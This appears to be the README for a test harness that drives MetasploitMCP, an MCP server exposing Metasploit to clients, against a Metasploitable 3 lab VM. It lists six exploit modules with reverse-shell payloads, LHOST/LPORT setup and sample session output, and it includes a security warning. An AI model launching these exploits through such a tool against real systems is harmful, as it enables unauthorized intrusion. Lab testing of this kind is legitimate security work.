# Metasploitable 3 Integration Test Setup

## Quick Reference

This document provides a complete walkthrough for setting up and running the Metasploitable 3 test harness.

## What This Harness Does

The Metasploitable 3 test harness is an **MCP client** that tests the entire MetasploitMCP server stack against real vulnerable targets. It:

1. Connects to the MetasploitMCP server via HTTP/JSON-RPC
2. Sends tool calls to run exploits through the MCP protocol
3. Verifies that sessions are created
4. Validates session functionality by running commands
5. Reports detailed results with timing and success metrics

## Architecture

```
┌──────────────────────────────────────────────┐
│  metasploitable3_test_harness.py             │
│  (MCP Client - This is what you run)         │
└───────────────────┬──────────────────────────┘
                    │
                    │ HTTP POST to /mcp
                    │ JSON-RPC protocol
                    ▼
┌──────────────────────────────────────────────┐
│  MetasploitMCP.py                            │
│  (MCP Server - Running on localhost:8085)   │
└───────────────────┬──────────────────────────┘
                    │
                    │ pymetasploit3 RPC calls
                    ▼
┌──────────────────────────────────────────────┐
│  msfrpcd                                     │
│  (Metasploit RPC Daemon - Port 55553)       │
└───────────────────┬──────────────────────────┘
                    │
                    │ Metasploit Framework
                    ▼
┌──────────────────────────────────────────────┐
│  Target: Metasploitable 3                    │
│  (Vulnerable VM - 10.0.2.15)                 │
└──────────────────────────────────────────────┘
```

## Prerequisites

### Required Software

- ✅ **Python 3.10+**
- ✅ **Poetry** (dependency management)
- ✅ **Metasploit Framework**
- ✅ **Metasploitable 3 VM** (Linux version)
- ✅ **VirtualBox or VMware** (for running the VM)

### Network Requirements

- ✅ Your machine can reach Metasploitable 3
- ✅ Metasploitable 3 can reach your machine (for reverse shells)
- ✅ No firewall blocking ports 4444 (or your chosen LPORT)

## Step-by-Step Setup

### Terminal 1: Start Metasploit RPC

```bash
# Start the Metasploit RPC daemon
msfrpcd -P mysecretpassword -S -a 127.0.0.1 -p 55553

# Expected output:
# [*] MSGRPC Service: 127.0.0.1:55553
# [*] MSGRPC Username: msf
# [*] MSGRPC Password: mysecretpassword
# [*] MSGRPC Backgrounding at 2024-10-27 10:00:00...
```

**Leave this terminal open!**

### Terminal 2: Start MetasploitMCP Server

```bash
# Navigate to project
cd /path/to/MetasploitMCP

# Set environment variables
export MSF_PASSWORD=mysecretpassword
export MSF_SERVER=127.0.0.1
export MSF_PORT=55553

# Install dependencies (first time only)
poetry install

# Start the MCP server
poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085

# Expected output:
# INFO - Successfully connected to Metasploit RPC at 127.0.0.1:55553 (SSL: False), version: 6.x.x
# INFO - Starting FastMCP HTTP server on http://127.0.0.1:8085
# INFO - MCP HTTP Endpoint: /mcp
```

**Leave this terminal open!**

### Terminal 3: Run the Test Harness

```bash
cd /path/to/MetasploitMCP

# Quick test (single exploit)
make test-metasploitable3-quick TARGET=10.0.2.15 LHOST=10.0.2.4

# Or run all tests
make test-metasploitable3 TARGET=10.0.2.15 LHOST=10.0.2.4

# Or use the Python script directly
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --lport 4444
```

## Command Reference

### Using Makefile (Recommended)

```bash
# List all available tests
make list-metasploitable3-tests

# Run quick test (ProFTPD only)
make test-metasploitable3-quick TARGET=10.0.2.15 LHOST=10.0.2.4

# Run all tests
make test-metasploitable3 TARGET=10.0.2.15 LHOST=10.0.2.4 LPORT=4444

# Run harness unit tests
make test-harness
```

### Using Python Script Directly

```bash
# List tests
poetry run python metasploitable3_test_harness.py --list-tests

# Run all tests
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4

# Run specific test
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --test "ProFTPD"

# Verbose mode
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --verbose

# Stop on first failure
poetry run python metasploitable3_test_harness.py \
    --target 10.0.2.15 \
    --lhost 10.0.2.4 \
    --stop-on-failure
```

### Using Quick Test Script

```bash
# Run the quick test script
bash examples/metasploitable3_quicktest.sh 10.0.2.15 10.0.2.4

# The script checks connectivity and runs a single test
```

## IP Configuration Guide

### Understanding the IPs

- **TARGET** (`--target`): The Metasploitable 3 VM IP address
- **LHOST** (`--lhost`): Your attacking machine IP (where reverse shells connect back to)
- **LPORT** (`--lport`): Port for reverse connections (default: 4444)

### Finding Your IPs

```bash
# Find your network interfaces
ifconfig  # On Linux/Mac
ipconfig  # On Windows

# Common network configurations:

# VirtualBox NAT Network:
#   Host: 10.0.2.4
#   VM: 10.0.2.15

# VirtualBox Host-Only:
#   Host: 192.168.56.1
#   VM: 192.168.56.101

# VMware NAT:
#   Host: 192.168.x.1
#   VM: 192.168.x.x
```

### Verifying Connectivity

```bash
# From your machine to target
ping -c 3 10.0.2.15

# SSH to Metasploitable 3 and test reverse connectivity
ssh vagrant@10.0.2.15  # password: vagrant

# From inside Metasploitable 3:
ping -c 3 10.0.2.4  # Your LHOST
nc -zv 10.0.2.4 4444  # Test if port is reachable
```

## What Gets Tested

The harness includes 6 exploit tests covering common Metasploitable 3 vulnerabilities:

| Test | Module | Port | Expected User |
|------|--------|------|---------------|
| ProFTPD ModCopy Exec | `exploit/unix/ftp/proftpd_modcopy_exec` | 21/80 | www-data |
| Apache Shellshock | `exploit/multi/http/apache_mod_cgi_bash_env_exec` | 80 | www-data |
| Drupal Drupageddon | `exploit/multi/http/drupal_drupageddon` | 80 | www-data |
| phpMyAdmin RCE | `exploit/multi/http/phpmyadmin_preg_replace` | 80 | www-data |
| Rails ActionPack | `exploit/multi/http/rails_actionpack_inline_exec` | 3500 | chewbacca |
| UnrealIRCd Backdoor | `exploit/unix/irc/unreal_ircd_3281_backdoor` | 6697 | boba_fett |

## Expected Output

### Successful Test

```
================================================================================
Testing: ProFTPD ModCopy Exec
Description: ProFTPD 1.3.5 Mod_Copy Command Execution
Module: exploit/unix/ftp/proftpd_modcopy_exec
Payload: cmd/unix/reverse_perl
Notes: FTP service exploit via mod_copy vulnerability
================================================================================
Executing exploit...
Exploit execution result: {'success': True, 'data': 'Session 1 opened'}
Active sessions: {'success': True, 'data': 'Active sessions: 1'}
Detected session ID: 1
Session command result: {'success': True, 'data': 'uid=33(www-data) gid=33(www-data)'}
✓ Test PASSED - Session established (ID: 1)
```

### Summary Report

```
################################################################################
TEST SUMMARY
################################################################################

Total Tests: 6
Passed: 5 ✓
Failed: 1 ✗
Success Rate: 83.3%
Total Duration: 42.35s

Detailed Results:
--------------------------------------------------------------------------------
✓ PASS | ProFTPD ModCopy Exec (7.23s)
      Session ID: 1
      User Info: uid=33(www-data) gid=33(www-data) groups=33(www-data)
✓ PASS | Apache Shellshock (8.45s)
      Session ID: 2
      User Info: uid=33(www-data) gid=33(www-data) groups=33(www-data)
✗ FAIL | Drupal Drupageddon (5.12s)
      Error: No session established
✓ PASS | phpMyAdmin preg_replace (9.87s)
      Session ID: 3
      User Info: uid=33(www-data) gid=33(www-data) groups=33(www-data)
✓ PASS | Ruby on Rails ActionPack (6.34s)
      Session ID: 4
      User Info: uid=1124(chewbacca) gid=100(users) groups=100(users),999(docker)
✓ PASS | UnrealIRCd Backdoor (5.34s)
      Session ID: 5
      User Info: uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
```

## Troubleshooting

### Error: "Connection refused to http://127.0.0.1:8085"

**Problem**: MCP server is not running

**Solution**:
```bash
# In Terminal 2:
export MSF_PASSWORD=mysecretpassword
poetry run python MetasploitMCP.py --transport http --host 127.0.0.1 --port 8085
```

### Error: "Failed to connect to Metasploit RPC"

**Problem**: Metasploit RPC is not running or wrong credentials

**Solution**:
```bash
# In Terminal 1:
msfrpcd -P mysecretpassword -S -a 127.0.0.1 -p 55553

# In Terminal 2, set correct password:
export MSF_PASSWORD=mysecretpassword
```

### Warning: "Exploit ran but no session detected"

**Problem**: Network connectivity issues or LHOST is wrong

**Solution**:
1. Verify LHOST is correct:
   ```bash
   # SSH to Metasploitable 3
   ssh vagrant@10.0.2.15
   
   # From inside, ping your LHOST
   ping 10.0.2.4
   ```

2. Check firewall:
   ```bash
   # On your machine, allow incoming on LPORT
   sudo ufw allow 4444  # Linux
   # Or disable firewall temporarily for testing
   ```

3. Verify service is running:
   ```bash
   nmap -p 21,80,6697 10.0.2.15
   ```

### Error: "Target is not reachable"

**Problem**: Network configuration or VM not running

**Solution**:
1. Verify VM is running in VirtualBox/VMware
2. Check network adapter settings (NAT Network or Host-Only)
3. Test connectivity:
   ```bash
   ping 10.0.2.15
   ```

## Running Unit Tests

The harness has comprehensive unit tests that don't require a real target:

```bash
# Run harness unit tests
make test-harness

# Or with pytest directly
poetry run pytest tests/test_metasploitable3_harness.py -v

# With coverage
poetry run pytest tests/test_metasploitable3_harness.py --cov=metasploitable3_test_harness -v
```

## Development and Customization

### Adding New Tests

Edit `metasploitable3_test_harness.py` and add to `get_exploit_tests()`:

```python
ExploitTest(
    name="My New Exploit",
    description="Description",
    module="exploit/path/to/module",
    payload="payload/type",
    options={
        "RHOSTS": self.target_ip,
        "RPORT": "8080",
        "LHOST": self.lhost,
        "LPORT": str(self.lport),
    },
    expected_user="username",
    notes="Additional notes"
),
```

### Modifying Test Behavior

Subclass the harness:

```python
class CustomHarness(Metasploitable3TestHarness):
    async def run_single_test(self, test: ExploitTest) -> TestResult:
        # Custom logic before test
        logger.info("Custom pre-test setup...")
        
        # Run the test
        result = await super().run_single_test(test)
        
        # Custom logic after test
        if result.success:
            logger.info("Custom cleanup...")
        
        return result
```

## Documentation

For more detailed information:

- **[Quick Start Guide](docs/QUICK_START_TESTING.md)** - Fast setup guide
- **[Full Documentation](docs/METASPLOITABLE3_TESTING.md)** - Complete reference
- **[MetasploitMCP API](docs/API.md)** - MCP server API documentation

## Security Notice

⚠️ **WARNING**: This tool performs real exploitation attacks.

- ✅ Only use in authorized testing environments
- ✅ Never use against systems you don't own
- ✅ Ensure proper network isolation
- ✅ Comply with all applicable laws and regulations

Unauthorized access to computer systems is illegal. You are solely responsible for ensuring proper authorization.

## Support

If you encounter issues:

1. Check the troubleshooting section above
2. Review the detailed documentation in `docs/`
3. Enable verbose mode for debugging
4. Check MCP server and Metasploit RPC logs

---

**Project**: MetasploitMCP  
**Version**: 2.0.0  
**Last Updated**: October 2025

